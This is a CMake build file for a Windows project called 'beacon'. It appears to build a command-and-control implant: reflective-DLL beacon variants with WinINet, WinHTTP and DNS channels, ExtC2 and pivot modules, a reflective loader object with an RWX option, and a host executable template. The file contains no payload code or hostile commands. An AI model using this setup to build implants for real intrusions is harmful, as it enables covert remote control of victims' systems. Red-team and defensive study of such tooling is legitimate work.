# Beacon user-mode product — standard CMake project.
# cmake -S . -B build -A x64
# cmake --build build --config Release
cmake_minimum_required(VERSION 3.20)
set(CMAKE_MSVC_RUNTIME_LIBRARY "MultiThreaded$<$<CONFIG:Debug>:Debug>")
project(beacon LANGUAGES C CXX)

if(NOT WIN32)
  message(FATAL_ERROR "This project targets Windows (MSVC or clang-cl).")
endif()

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Match the historical Release flags: static CRT, no RTTI, size-oriented.
set(CMAKE_INTERPROCEDURAL_OPTIMIZATION OFF)

set(BEACON_OUT "${CMAKE_BINARY_DIR}/out")
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY "${BEACON_OUT}")
set(CMAKE_LIBRARY_OUTPUT_DIRECTORY "${BEACON_OUT}")
set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY "${BEACON_OUT}")
foreach(_cfg DEBUG RELEASE RELWITHDEBINFO MINSIZEREL)
  set(CMAKE_RUNTIME_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
  set(CMAKE_LIBRARY_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
  set(CMAKE_ARCHIVE_OUTPUT_DIRECTORY_${_cfg} "${BEACON_OUT}")
endforeach()

include("${CMAKE_SOURCE_DIR}/cmake/sources.cmake")

# channel_doh.c includes C++ headers; interpreter .c files are picoc (C).
set_source_files_properties(src/channel_doh.c PROPERTIES LANGUAGE CXX)
set_source_files_properties(${INTERPRETER_C_SOURCES} PROPERTIES
  LANGUAGE C
  COMPILE_DEFINITIONS BI_NO_STDIO)

set(BEACON_COMMON_DEFS
  WIN32_LEAN_AND_MEAN
  _CRT_SECURE_NO_WARNINGS
  WIN64
  WIN_X64
  _WINDOWS
  _USRDLL
  NDEBUG
  REFLECTIVE_DLL_EXPORTS
  REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR
  REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN
  LTM_DESC
  USE_LTM
)

set(BEACON_SYS_LIBS
  kernel32
  user32
  gdi32
  advapi32
  shell32
  ole32
  oleaut32
  uuid
  ws2_32
  wininet
  dnsapi
  winhttp
)

set(BEACON_LIB_DIR "${CMAKE_SOURCE_DIR}/lib" CACHE PATH
  "Directory with tomcrypt.x64.lib / tommath.x64.lib (tests may override)")
set(BEACON_TEST_EXTRA_DEFS "" CACHE STRING
  "Extra preprocessor defs for beacon_tests (e.g. BEACON_TEST_ENABLE_KEYGEN)")

set(BEACON_TOMCRYPT "${CMAKE_SOURCE_DIR}/lib/tomcrypt.x64.lib")
set(BEACON_TOMMATH  "${CMAKE_SOURCE_DIR}/lib/tommath.x64.lib")
set(BEACON_TEST_TOMCRYPT "${BEACON_LIB_DIR}/tomcrypt.x64.lib")
set(BEACON_TEST_TOMMATH  "${BEACON_LIB_DIR}/tommath.x64.lib")
if(NOT EXISTS "${BEACON_TOMCRYPT}" OR NOT EXISTS "${BEACON_TOMMATH}")
  message(FATAL_ERROR "Vendored libs missing under lib/")
endif()
if(NOT EXISTS "${BEACON_TEST_TOMCRYPT}" OR NOT EXISTS "${BEACON_TEST_TOMMATH}")
  message(FATAL_ERROR "Test libs missing under BEACON_LIB_DIR=${BEACON_LIB_DIR}")
endif()

function(add_beacon_dll target_name output_name sources extra_defs)
  add_library(${target_name} SHARED ${${sources}})
  target_include_directories(${target_name} PRIVATE
    "${CMAKE_SOURCE_DIR}/src"
    "${CMAKE_SOURCE_DIR}/tomcrypt-headers")
  target_compile_definitions(${target_name} PRIVATE
    ${BEACON_COMMON_DEFS}
    ${extra_defs})
  target_compile_options(${target_name} PRIVATE
    /W3 /O1 /Ob1 /Os /Oi /GF /Gy /GS- /nologo
    $<$<COMPILE_LANGUAGE:CXX>:/GR- /std:c++17>)
  target_link_directories(${target_name} PRIVATE "${CMAKE_SOURCE_DIR}")
  target_link_libraries(${target_name} PRIVATE
    ${BEACON_SYS_LIBS}
    "${BEACON_TOMCRYPT}"
    "${BEACON_TOMMATH}")
  target_link_options(${target_name} PRIVATE
    /NOLOGO
    /MACHINE:X64
    /SUBSYSTEM:WINDOWS
    /OPT:REF
    /OPT:ICF
    /INCREMENTAL:NO
    /MAP:${BEACON_OUT}/${output_name}.map)
  set_target_properties(${target_name} PROPERTIES
    OUTPUT_NAME "${output_name}"
    PREFIX ""
    SUFFIX ".dll"
    LINKER_LANGUAGE CXX)
endfunction()

add_beacon_dll(beacon_wininet beacon.x64 BEACON_WININET_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3")
add_beacon_dll(beacon_winhttp winhttpb.x64 BEACON_WINHTTP_SOURCES "BW_LOADER_PRIVATE;BEACON_TIER3")
add_beacon_dll(dnsb           dnsb.x64     DNSB_SOURCES          "BOFWIN_DISABLE")
add_beacon_dll(extc2          extc2.x64    EXTC2_SOURCES         "BOFWIN_DISABLE")
add_beacon_dll(pivot          pivot.x64    PIVOT_SOURCES         "BOFWIN_DISABLE")

# Host-side unit tests (console). Separate flags: C++ exceptions + STL.
add_executable(beacon_tests
  tests/test_main.cpp
  tests/test_parse.cpp
  tests/test_bformat.cpp
  tests/test_settings.cpp
  tests/test_guardrails.cpp
  tests/test_datastore.cpp
  tests/test_syscalls.cpp
  tests/test_s4.cpp
  tests/test_crypto.cpp
  tests/test_miniprintf.cpp
  tests/test_keygen.cpp
  src/parse.cpp
  src/bformat.cpp
  src/settings.cpp
  src/datastore.cpp
  src/hostprof.cpp
  src/syscalls.cpp
  src/track_memory.cpp
  src/security.cpp
  src/crypto.cpp
  src/miniprintf.cpp)
target_include_directories(beacon_tests PRIVATE
  "${CMAKE_SOURCE_DIR}/src"
  "${CMAKE_SOURCE_DIR}/tomcrypt-headers"
  "${CMAKE_SOURCE_DIR}/tests")
target_compile_definitions(beacon_tests PRIVATE
  _CRT_SECURE_NO_WARNINGS
  WIN32_LEAN_AND_MEAN
  LTM_DESC
  USE_LTM
  BW_TRACE_ENABLE)
target_compile_options(beacon_tests PRIVATE /W3 /EHsc)
target_link_directories(beacon_tests PRIVATE "${CMAKE_SOURCE_DIR}" "${BEACON_LIB_DIR}")
target_link_libraries(beacon_tests PRIVATE
  ws2_32 advapi32
  "${BEACON_TEST_TOMCRYPT}" "${BEACON_TEST_TOMMATH}")
if(BEACON_TEST_EXTRA_DEFS)
  target_compile_definitions(beacon_tests PRIVATE ${BEACON_TEST_EXTRA_DEFS})
endif()
set_target_properties(beacon_tests PROPERTIES OUTPUT_NAME tests)

add_executable(load_smoke tests/load_smoke.cpp)
target_compile_options(load_smoke PRIVATE /W3 /EHsc)
target_link_libraries(load_smoke PRIVATE kernel32)
add_dependencies(load_smoke beacon_wininet)

# UDRL COFF objects (user-mode loader). /Zl so the .obj has no defaultlib.
function(add_udrl_obj target_name extra_defs)
  add_library(${target_name} OBJECT udrl/ReflectiveLoader.c)
  target_include_directories(${target_name} PRIVATE
    "${CMAKE_SOURCE_DIR}/udrl" "${CMAKE_SOURCE_DIR}/src")
  target_compile_definitions(${target_name} PRIVATE
    BW_UDRL_USER_DATA_DELIVER=1 BW_LOADER_PRIVATE=1 ${extra_defs})
  target_compile_options(${target_name} PRIVATE /W3 /O2 /GS- /Zl /Gy- /nologo)
endfunction()
add_udrl_obj(udrl     "")
add_udrl_obj(udrl_rwx "BW_DIAG_RWX")

add_custom_target(udrl_export ALL
  COMMAND ${CMAKE_COMMAND} -E make_directory "${BEACON_OUT}"
  COMMAND ${CMAKE_COMMAND} -E copy_if_different
          "$<TARGET_OBJECTS:udrl>"
          "${BEACON_OUT}/ReflectiveLoader.x64.obj"
  COMMAND ${CMAKE_COMMAND} -E copy_if_different
          "$<TARGET_OBJECTS:udrl_rwx>"
          "${BEACON_OUT}/ReflectiveLoader.rwx.x64.obj"
  DEPENDS udrl udrl_rwx
  COMMENT "export UDRL COFF objects"
  VERBATIM)

# Host EXE template (former build.yml cl/link of udrl/hostexe.c).
add_executable(host_template WIN32 udrl/hostexe.c)
target_compile_options(host_template PRIVATE /W3 /O1 /GS- /nologo)
target_link_libraries(host_template PRIVATE kernel32)
target_link_options(host_template PRIVATE
  /NOLOGO
  /ENTRY:bw_entry
  /MACHINE:X64
  /STACK:16777216
  /DYNAMICBASE
  /NXCOMPAT)
set_target_properties(host_template PROPERTIES
  OUTPUT_NAME host_template_x64)

enable_testing()
add_test(NAME host_unit COMMAND beacon_tests)
add_test(NAME load_smoke_wininet COMMAND load_smoke "$<TARGET_FILE:beacon_wininet>")
set_tests_properties(load_smoke_wininet PROPERTIES DEPENDS host_unit)
